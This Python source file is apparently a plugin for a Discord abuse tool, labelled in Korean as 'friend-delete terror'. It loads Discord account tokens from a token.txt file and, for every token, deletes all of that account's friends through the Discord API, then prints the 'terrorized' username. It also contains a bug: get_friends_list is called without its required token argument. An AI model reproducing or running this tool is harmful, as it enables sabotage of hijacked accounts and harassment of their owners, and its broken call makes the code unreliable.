import asyncio
from typing import Any
import importlib

import aiohttp
from aiohttp import ClientResponseError
import colorama
from colorama import Fore

from utils.Plugin.PluginABC import PluginABC
from utils.Setting.setup_most import heads
from utils.Setting.lib import tokens

colorama.init(autoreset=True)


class AccountBomber(PluginABC):
    plugin_name = "친삭 테러"
    
    @classmethod
    async def get_friends_list(cls, token: str) -> tuple[dict[Any, Any], dict[Any, Any]]:
        my_information_url = "https://discord.com/api/v10/users/@me"
        relationship_url = "https://discord.com/api/v10/users/@me/relationships"
        
        async with (
            aiohttp.ClientSession() as session,
            session.get(my_information_url, headers=heads(token=token)) as user_response,
            session.get(relationship_url, headers=heads(token=token)) as response,
        ):
            return await user_response.json(), await response.json()
    
    @classmethod
    async def remove_friend(cls, token: str):
        base_url = "https://discord.com/api/v10/users/@me"
        relationship_url = f"{base_url}/relationships"
        
        user_info: dict[Any, Any]
        friend_infos: dict[Any, Any]    
        user_info, friend_infos = await cls.get_friends_list()
        username, discriminator = user_info["username"], user_info["discriminator"]
        
        try: 
            async with aiohttp.ClientSession() as session:
                for friend_info in friend_infos:
                    url = f"{relationship_url}/{friend_info['id']}"
                    async with session.delete(url=url, headers=heads(token=token)) as response:
                        response.raise_for_status()
                        
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 테러한 사용자 이름: {Fore.WHITE}{username}#{discriminator}{Fore.RESET}")
        except ClientResponseError:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] 실패...")
                    
        
    @classmethod
    async def main(cls):
        option = super().get_option()
        
        if option == 1:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] token.txt에 있는 토큰을 조회하고 해당 토큰의 친구들을 삭제하는 중입니다.\n")
            await asyncio.gather(*(cls.remove_friend(token=token) for token in tokens))
            
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
            await importlib.import_module("main").Hydron()
        else:
            await importlib.import_module("main").Hydron()